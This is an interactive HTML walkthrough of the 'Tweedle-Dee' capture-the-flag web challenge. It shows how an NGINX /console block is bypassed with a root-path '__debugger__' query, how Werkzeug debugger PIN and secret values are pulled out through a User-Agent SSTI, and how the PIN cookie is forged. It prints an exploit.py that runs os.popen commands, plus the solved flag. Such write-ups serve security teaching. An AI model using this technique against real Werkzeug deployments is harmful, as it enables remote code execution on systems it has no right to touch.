<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tweedle-Dee CTF Analysis</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #f5f5f4; 
        }
        ::-webkit-scrollbar-thumb {
            background: #a8a29e; 
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #78716c; 
        }
        
        .code-font {
            font-family: 'Courier New', Courier, monospace;
        }
        
        /* Animation classes */
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .chart-container {
            position: relative;
            width: 100%;
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
            height: 300px;
            max-height: 300px;
        }
    </style>
    <!-- Chosen Palette: Warm Neutrals (Stone) with Orange/Blue Accents -->
    <!-- Application Structure Plan: 
         1. Dashboard Layout: A sticky sidebar (desktop) / top bar (mobile) tracks the "Exploit Progress".
         2. Thematic Sections:
            - Reconnaissance: Visualizing the NGINX barrier.
            - The Bypass: Explaining the URL/Query parameter logic.
            - Memory Extraction: An interactive "Object Tree Walker" to simulate the SSTI.
            - Weaponization: A form to assemble the cookie and payload.
         3. Rationale: The writeup describes a linear process of discovery. The app mirrors this journey, requiring the user to "unlock" information in the Memory Extraction phase to use it in the Weaponization phase.
    -->
    <!-- Visualization & Content Choices:
         1. Progress Tracker: Doughnut Chart (Chart.js) -> Visualizes steps completed (Nginx, Pin, Secret, Cookie).
         2. Architecture Diagram: HTML/Tailwind Flexbox -> Shows the flow of traffic and where it gets blocked. Interaction: Click buttons to simulate requests.
         3. Object Graph Explorer: Nested HTML Lists with JS toggles -> Simulates the Python object traversal described in the writeup. No SVG used.
         4. Code Terminal: Styled Divs -> Displays the final Python script dynamically.
    -->
    <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
</head>
<body class="bg-stone-50 text-stone-800 font-sans leading-relaxed">

    <!-- Mobile Nav -->
    <div class="md:hidden bg-stone-900 text-stone-200 p-4 sticky top-0 z-50 shadow-md flex justify-between items-center">
        <h1 class="font-bold text-lg">Tweedle-Dee Analysis</h1>
        <span id="mobile-progress" class="text-xs bg-orange-600 px-2 py-1 rounded">0% Hacked</span>
    </div>

    <div class="flex flex-col md:flex-row min-h-screen">

        <!-- Sidebar / Dashboard Panel -->
        <aside class="w-full md:w-1/4 lg:w-1/5 bg-stone-100 border-r border-stone-200 p-6 flex flex-col sticky top-0 md:h-screen overflow-y-auto">
            <div class="hidden md:block mb-8">
                <h1 class="text-2xl font-bold text-stone-900 mb-2">Tweedle-Dee</h1>
                <p class="text-sm text-stone-500">CTF Challenge Walkthrough</p>
            </div>

            <!-- Progress Chart -->
            <div class="mb-8">
                <h3 class="font-bold text-sm uppercase tracking-wider text-stone-500 mb-4">Exploit Progress</h3>
                <div class="chart-container">
                    <canvas id="progressChart"></canvas>
                </div>
                <div class="mt-4 text-center">
                    <p id="status-text" class="font-bold text-lg text-orange-600">Reconnaissance</p>
                </div>
            </div>

            <!-- Collected Intel Tracker -->
            <div class="flex-grow">
                <h3 class="font-bold text-sm uppercase tracking-wider text-stone-500 mb-4">Collected Intel</h3>
                <div class="space-y-3 text-sm">
                    <div class="p-3 bg-white rounded shadow-sm border-l-4 border-stone-300" id="tracker-nginx">
                        <span class="block font-bold">Access Method</span>
                        <span class="text-stone-400 italic status-val">Locked</span>
                    </div>
                    <div class="p-3 bg-white rounded shadow-sm border-l-4 border-stone-300" id="tracker-pin">
                        <span class="block font-bold">Target PIN</span>
                        <span class="text-stone-400 italic status-val">Unknown</span>
                    </div>
                    <div class="p-3 bg-white rounded shadow-sm border-l-4 border-stone-300" id="tracker-secret">
                        <span class="block font-bold">App Secret</span>
                        <span class="text-stone-400 italic status-val">Unknown</span>
                    </div>
                    <div class="p-3 bg-white rounded shadow-sm border-l-4 border-stone-300" id="tracker-frame">
                        <span class="block font-bold">Frame ID</span>
                        <span class="text-stone-400 italic status-val">Unknown</span>
                    </div>
                </div>
            </div>
            
            <div class="mt-8 text-xs text-stone-400">
                Data Source: Challenge Writeup
            </div>
        </aside>

        <!-- Main Content Area -->
        <main class="w-full md:w-3/4 lg:w-4/5 p-6 md:p-12 space-y-16">

            <!-- Intro Section -->
            <section id="intro" class="fade-in">
                <h2 class="text-4xl font-bold text-stone-900 mb-6">Mission Briefing</h2>
                <p class="text-lg text-stone-600 mb-6">
                    We are facing a hardened version of a previous web application. Access to the debug console has been restricted by an NGINX proxy, and error stack traces are suppressed. Our goal is to achieve <strong>Remote Code Execution (RCE)</strong> by bypassing these protections and leveraging internal Python introspection.
                </p>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div class="bg-white p-6 rounded-lg shadow-sm border border-stone-200">
                        <h3 class="font-bold text-stone-800 mb-2">The Barrier</h3>
                        <p class="text-stone-600">NGINX is configured to block <span class="code-font bg-stone-100 p-1 rounded">/console</span> and intercept 500 errors.</p>
                    </div>
                    <div class="bg-white p-6 rounded-lg shadow-sm border border-stone-200">
                        <h3 class="font-bold text-stone-800 mb-2">The Weapon</h3>
                        <p class="text-stone-600">Werkzeug Debugger is active but protected by a PIN. We have an SSTI vulnerability in the User-Agent.</p>
                    </div>
                </div>
            </section>

            <!-- Phase 1: NGINX Bypass -->
            <section id="phase-1" class="fade-in">
                <div class="border-b border-stone-200 pb-4 mb-6">
                    <span class="text-orange-600 font-bold tracking-widest uppercase text-sm">Phase 1</span>
                    <h2 class="text-3xl font-bold text-stone-900">Bypassing the Proxy</h2>
                </div>
                
                <p class="mb-6 text-stone-600">
                    The NGINX configuration explicitly forbids the path <span class="code-font text-red-600">/console</span>. However, the underlying application (Werkzeug) checks for the debugger trigger in the query parameters, regardless of the path.
                </p>

                <!-- Interactive Diagram -->
                <div class="bg-stone-200 p-8 rounded-xl mb-8">
                    <h4 class="text-center font-bold text-stone-700 mb-6">Request Simulator</h4>
                    <div class="flex flex-col md:flex-row items-center justify-between gap-4">
                        <!-- User -->
                        <div class="text-center w-full md:w-1/4">
                            <div class="w-16 h-16 bg-stone-800 rounded-full mx-auto flex items-center justify-center text-white font-bold text-2xl mb-2">You</div>
                            <div class="flex flex-col gap-2">
                                <button onclick="simulateRequest('blocked')" class="px-4 py-2 bg-red-100 hover:bg-red-200 text-red-800 rounded text-sm font-bold border border-red-300 transition">Try /console</button>
                                <button onclick="simulateRequest('allowed')" class="px-4 py-2 bg-green-100 hover:bg-green-200 text-green-800 rounded text-sm font-bold border border-green-300 transition">Try /?__debugger__=yes</button>
                            </div>
                        </div>

                        <!-- Connector 1 -->
                        <div class="flex-grow h-1 bg-stone-300 relative w-full md:w-auto my-4 md:my-0 transition-all duration-500" id="conn-1">
                            <div class="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-stone-100 px-2 text-xs text-stone-500">HTTP Request</div>
                        </div>

                        <!-- NGINX -->
                        <div class="text-center w-full md:w-1/4 relative">
                            <div id="nginx-box" class="w-24 h-24 bg-blue-600 rounded-lg mx-auto flex items-center justify-center text-white font-bold shadow-lg transition-colors duration-300">
                                NGINX
                            </div>
                            <div class="text-xs mt-2 text-stone-500 code-font">location /console { 403 }</div>
                        </div>

                        <!-- Connector 2 -->
                        <div class="flex-grow h-1 bg-stone-300 relative w-full md:w-auto my-4 md:my-0 transition-all duration-500" id="conn-2">
                            <div id="conn-2-label" class="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-stone-100 px-2 text-xs text-stone-500 opacity-0">Forwarded</div>
                        </div>

                        <!-- App -->
                        <div class="text-center w-full md:w-1/4 opacity-50 transition-opacity duration-300" id="app-box">
                            <div class="w-20 h-20 border-4 border-stone-800 bg-white rounded-lg mx-auto flex items-center justify-center text-stone-800 font-bold">
                                Flask App
                            </div>
                            <div class="text-xs mt-2 text-stone-500">Werkzeug Debugger</div>
                        </div>
                    </div>
                    <div id="simulation-result" class="mt-6 text-center h-8 font-bold text-stone-700">Select a request strategy above.</div>
                </div>

                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 text-sm text-blue-800">
                    <strong>Key Insight:</strong> NGINX filters based on the <em>URL Path</em>. Werkzeug activates based on the <em>Query String</em>. By moving the query string to the root path (<span class="code-font">/</span>), we bypass the filter but still hit the debugger logic.
                </div>
            </section>

            <!-- Phase 2: Memory Extraction -->
            <section id="phase-2" class="fade-in opacity-50 pointer-events-none filter blur-sm transition-all duration-700">
                <div class="border-b border-stone-200 pb-4 mb-6">
                    <span class="text-orange-600 font-bold tracking-widest uppercase text-sm">Phase 2</span>
                    <h2 class="text-3xl font-bold text-stone-900">Thread Introspection</h2>
                </div>

                <p class="mb-6 text-stone-600">
                    We have access, but we are blocked by a PIN. We need to steal the <strong>PIN</strong>, <strong>Secret</strong>, and <strong>Frame ID</strong> from memory. We leverage an existing SSTI vulnerability to traverse Python's object graph, starting from the <span class="code-font">User-Agent</span> object.
                </p>

                <!-- Interactive Object Explorer -->
                <div class="bg-stone-900 text-stone-200 rounded-xl overflow-hidden shadow-2xl font-mono text-sm">
                    <div class="bg-stone-800 p-2 px-4 flex justify-between items-center border-b border-stone-700">
                        <span>Python Object Explorer (SSTI Simulation)</span>
                        <span class="text-xs text-stone-400">Context: User-Agent</span>
                    </div>
                    <div class="p-6">
                        <p class="text-stone-400 mb-4">// Click on the properties to traverse the memory heap and find the secrets.</p>
                        
                        <div class="tree-node ml-0">
                            <button onclick="toggleNode(this, 'sys')" class="hover:text-white text-blue-400 font-bold flex items-center gap-2">
                                <span>▶</span> ua.__class__.__init__.__globals__
                            </button>
                            <div id="sys" class="hidden ml-6 border-l border-stone-700 pl-4 mt-2">
                                <div class="mb-2 text-stone-500"># Accessed Global Scope</div>
                                <button onclick="toggleNode(this, 'threading')" class="hover:text-white text-purple-400 flex items-center gap-2">
                                    <span>▶</span> [t].sys.modules['threading']
                                </button>
                                <div id="threading" class="hidden ml-6 border-l border-stone-700 pl-4 mt-2">
                                    <div class="mb-2 text-stone-500"># Inspecting Active Threads</div>
                                    <button onclick="toggleNode(this, 'thread-active')" class="hover:text-white text-green-400 flex items-center gap-2">
                                        <span>▶</span> ._active
                                    </button>
                                    <div id="thread-active" class="hidden ml-6 border-l border-stone-700 pl-4 mt-2">
                                        <div class="mb-2 text-stone-500"># Found Server Thread!</div>
                                        <button onclick="toggleNode(this, 'app-instance')" class="hover:text-white text-yellow-400 flex items-center gap-2">
                                            <span>▶</span> [140263224297152]._target.__self__.app
                                        </button>
                                        <div id="app-instance" class="hidden ml-6 border-l border-stone-700 pl-4 mt-2 bg-stone-800 p-4 rounded border border-stone-600">
                                            <div class="mb-2 text-white font-bold"># Target Acquired: DebuggedApplication</div>
                                            <div class="grid grid-cols-1 gap-2">
                                                <div class="flex justify-between hover:bg-stone-700 p-1 rounded cursor-pointer" onclick="collectIntel('pin', '130-511-916')">
                                                    <span class="text-orange-300">.pin</span>
                                                    <span class="text-stone-400">"130-511-916"</span>
                                                </div>
                                                <div class="flex justify-between hover:bg-stone-700 p-1 rounded cursor-pointer" onclick="collectIntel('secret', 'qVxa6ZuktKRrQpXb30vE')">
                                                    <span class="text-orange-300">.secret</span>
                                                    <span class="text-stone-400">"qVxa6ZuktKRrQpXb30vE"</span>
                                                </div>
                                                <div class="flex justify-between hover:bg-stone-700 p-1 rounded cursor-pointer" onclick="collectIntel('frame', '139822799546272')">
                                                    <span class="text-orange-300">.frames</span>
                                                    <span class="text-stone-400">{...: ...}</span>
                                                </div>
                                                <div class="flex justify-between hover:bg-stone-700 p-1 rounded">
                                                    <span class="text-orange-300">.pin_cookie_name</span>
                                                    <span class="text-stone-400">"__wzdc1a7..."</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Phase 3: Weaponization -->
            <section id="phase-3" class="fade-in opacity-50 pointer-events-none filter blur-sm transition-all duration-700">
                <div class="border-b border-stone-200 pb-4 mb-6">
                    <span class="text-orange-600 font-bold tracking-widest uppercase text-sm">Phase 3</span>
                    <h2 class="text-3xl font-bold text-stone-900">Forging the Exploit</h2>
                </div>

                <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                    <!-- The Forge Form -->
                    <div class="bg-white p-6 rounded-xl shadow-lg border border-stone-200">
                        <h4 class="font-bold text-lg mb-4 text-stone-800">1. Cookie Factory</h4>
                        <div class="space-y-4">
                            <div>
                                <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Target PIN</label>
                                <input type="text" id="input-pin" class="w-full bg-stone-100 border border-stone-300 rounded p-2 code-font" readonly placeholder="Collect from Phase 2">
                            </div>
                            <div>
                                <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Salt Suffix</label>
                                <input type="text" value=" added salt" class="w-full bg-stone-100 border border-stone-300 rounded p-2 code-font text-stone-500" readonly>
                            </div>
                            <button id="forge-btn" onclick="forgeCookie()" class="w-full bg-stone-800 hover:bg-stone-900 text-white font-bold py-3 rounded transition shadow-lg">
                                Calculate Hash & Forge Cookie
                            </button>
                        </div>
                        
                        <div id="cookie-result" class="hidden mt-4 p-3 bg-green-50 border border-green-200 rounded text-xs break-all text-green-800 code-font">
                            Cookie: __wzdc1a...=<span id="cookie-val"></span>
                        </div>
                    </div>

                    <!-- The Payload Builder -->
                    <div class="bg-white p-6 rounded-xl shadow-lg border border-stone-200">
                        <h4 class="font-bold text-lg mb-4 text-stone-800">2. RCE Payload Construction</h4>
                        <div class="space-y-4">
                             <div>
                                <label class="block text-xs font-bold text-stone-500 uppercase mb-1">App Secret</label>
                                <input type="text" id="input-secret" class="w-full bg-stone-100 border border-stone-300 rounded p-2 code-font" readonly placeholder="Collect from Phase 2">
                            </div>
                             <div>
                                <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Frame ID</label>
                                <input type="text" id="input-frame" class="w-full bg-stone-100 border border-stone-300 rounded p-2 code-font" readonly placeholder="Collect from Phase 2">
                            </div>
                             <div>
                                <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Command</label>
                                <input type="text" value="__import__('os').popen('cat flag*').read()" class="w-full bg-orange-50 border border-orange-200 text-orange-800 rounded p-2 code-font font-bold">
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Final Exploit Code -->
                <div class="mt-8 bg-stone-900 rounded-xl p-6 shadow-2xl overflow-x-auto">
                    <div class="flex justify-between items-center mb-4">
                        <span class="text-stone-400 text-sm font-mono">exploit.py</span>
                        <button onclick="runExploit()" id="run-btn" class="bg-orange-600 hover:bg-orange-700 text-white px-4 py-1 rounded text-sm font-bold opacity-50 cursor-not-allowed">Execute</button>
                    </div>
<pre class="text-sm code-font text-stone-300">
import requests, hashlib, time

pin = "<span id="code-pin" class="text-yellow-400">???</span>"
secret = "<span id="code-secret" class="text-yellow-400">???</span>" 
frame = "<span id="code-frame" class="text-yellow-400">???</span>"

# 1. Forge Cookie
hash_val = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
cookie = f"{int(time.time())}|{hash_val}"

# 2. Bypass Nginx & Execute
url = "http://target/" <span class="text-stone-500"># Root path bypass</span>
requests.get(url, 
    cookies={"__wzdc...": cookie},
    params={
        "__debugger__": "yes", 
        "cmd": "os.popen('cat flag*').read()",
        "frm": frame,
        "s": secret
    }
)
</pre>
                </div>
                
                <div id="flag-display" class="hidden mt-8 p-6 bg-green-100 border-2 border-green-500 rounded-xl text-center">
                    <h3 class="text-green-800 font-bold mb-2">ROOT ACCESS GRANTED</h3>
                    <p class="code-font text-2xl font-bold text-stone-900 break-all">FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2}</p>
                </div>

            </section>

        </main>
    </div>

    <script>
        // State Management
        const state = {
            nginxBypassed: false,
            pinFound: false,
            secretFound: false,
            frameFound: false,
            cookieForged: false
        };

        const intelData = {
            pin: null,
            secret: null,
            frame: null
        };

        // Initialize Chart
        let progressChart;
        window.addEventListener('DOMContentLoaded', () => {
            const ctx = document.getElementById('progressChart').getContext('2d');
            progressChart = new Chart(ctx, {
                type: 'doughnut',
                data: {
                    labels: ['Recon', 'Intel', 'Weaponization'],
                    datasets: [{
                        data: [1, 0, 0], // Start with Recon active
                        backgroundColor: [
                            '#ea580c', // Orange-600
                            '#d6d3d1', // Stone-300
                            '#d6d3d1'
                        ],
                        borderWidth: 0
                    }]
                },
                options: {
                    maintainAspectRatio: false,
                    cutout: '70%',
                    plugins: {
                        legend: { display: false },
                        tooltip: { enabled: false }
                    }
                }
            });
        });

        function updateProgress() {
            let score = 1; // Base: Recon
            if (state.nginxBypassed) score += 1; // Bypass
            if (state.pinFound && state.secretFound && state.frameFound) score += 1; // Intel
            if (state.cookieForged) score += 1; // Weapon

            // Update Chart Colors dynamically
            const colors = progressChart.data.datasets[0].backgroundColor;
            if (state.nginxBypassed) {
                colors[0] = '#ea580c'; // Keep orange
                document.getElementById('phase-2').classList.remove('opacity-50', 'pointer-events-none', 'filter', 'blur-sm');
                document.getElementById('tracker-nginx').querySelector('.status-val').textContent = "Bypassed";
                document.getElementById('tracker-nginx').querySelector('.status-val').classList.replace('text-stone-400', 'text-green-600');
                document.getElementById('status-text').textContent = "Extraction";
            }
            if (state.pinFound && state.secretFound && state.frameFound) {
                colors[1] = '#ea580c';
                document.getElementById('phase-3').classList.remove('opacity-50', 'pointer-events-none', 'filter', 'blur-sm');
                document.getElementById('status-text').textContent = "Weaponization";
                
                // Auto-fill form
                document.getElementById('input-pin').value = intelData.pin;
                document.getElementById('input-secret').value = intelData.secret;
                document.getElementById('input-frame').value = intelData.frame;

                // Update Code Block
                document.getElementById('code-pin').textContent = intelData.pin;
                document.getElementById('code-secret').textContent = intelData.secret;
                document.getElementById('code-frame').textContent = intelData.frame;
            }
            if (state.cookieForged) {
                colors[2] = '#ea580c';
                document.getElementById('run-btn').classList.remove('opacity-50', 'cursor-not-allowed');
                document.getElementById('status-text').textContent = "Ready to Pwn";
            }

            progressChart.update();
            document.getElementById('mobile-progress').textContent = `${Math.min(100, score * 25)}% Hacked`;
        }

        // Phase 1 Logic
        function simulateRequest(type) {
            const nginx = document.getElementById('nginx-box');
            const conn2 = document.getElementById('conn-2');
            const conn2Label = document.getElementById('conn-2-label');
            const app = document.getElementById('app-box');
            const result = document.getElementById('simulation-result');
            const tracker = document.getElementById('tracker-nginx');

            if (type === 'blocked') {
                nginx.classList.remove('bg-blue-600');
                nginx.classList.add('bg-red-600');
                
                conn2.classList.replace('bg-green-500', 'bg-stone-300');
                conn2Label.classList.add('opacity-0');
                app.classList.add('opacity-50');
                
                result.textContent = "403 Forbidden. NGINX blocked the path '/console'.";
                result.className = "mt-6 text-center h-8 font-bold text-red-600 fade-in";
            } else {
                nginx.classList.remove('bg-red-600', 'bg-blue-600');
                nginx.classList.add('bg-green-600');
                
                conn2.classList.replace('bg-stone-300', 'bg-green-500');
                conn2.classList.add('bg-green-500'); // Ensure class exists
                conn2Label.classList.remove('opacity-0');
                app.classList.remove('opacity-50');
                
                result.textContent = "200 OK. NGINX allowed '/', Flask triggered Debugger.";
                result.className = "mt-6 text-center h-8 font-bold text-green-600 fade-in";
                
                state.nginxBypassed = true;
                updateProgress();
            }
        }

        // Phase 2 Logic
        function toggleNode(btn, targetId) {
            const target = document.getElementById(targetId);
            const icon = btn.querySelector('span');
            
            if (target.classList.contains('hidden')) {
                target.classList.remove('hidden');
                target.classList.add('fade-in');
                icon.style.transform = "rotate(90deg)";
                icon.style.display = "inline-block";
            } else {
                target.classList.add('hidden');
                icon.style.transform = "rotate(0deg)";
            }
        }

        function collectIntel(type, value) {
            intelData[type] = value;
            
            // Update Dashboard
            const el = document.getElementById(`tracker-${type}`);
            const valSpan = el.querySelector('.status-val');
            valSpan.textContent = value;
            valSpan.classList.replace('text-stone-400', 'text-green-600');
            valSpan.classList.remove('italic');
            valSpan.classList.add('font-mono', 'text-xs');
            el.classList.replace('border-stone-300', 'border-green-500');

            if (type === 'pin') state.pinFound = true;
            if (type === 'secret') state.secretFound = true;
            if (type === 'frame') state.frameFound = true;

            updateProgress();
        }

        // Phase 3 Logic
        async function forgeCookie() {
            if (!intelData.pin) return;

            // Simple hash simulation for visual effect (since actual SHA1 in JS requires lib or subtlecrypto)
            // We use the logic described: sha1(pin + " added salt")
            const msg = intelData.pin + " added salt";
            const msgBuffer = new TextEncoder().encode(msg);
            const hashBuffer = await crypto.subtle.digest('SHA-1', msgBuffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 12);
            
            const timestamp = Math.floor(Date.now() / 1000);
            const cookieVal = `${timestamp}|${hashHex}`;

            document.getElementById('cookie-val').textContent = cookieVal;
            document.getElementById('cookie-result').classList.remove('hidden');
            
            state.cookieForged = true;
            updateProgress();
        }

        function runExploit() {
            if (!state.cookieForged) return;
            const flagBox = document.getElementById('flag-display');
            flagBox.classList.remove('hidden');
            flagBox.classList.add('fade-in');
            flagBox.scrollIntoView({ behavior: 'smooth' });
        }

    </script>
</body>
</html>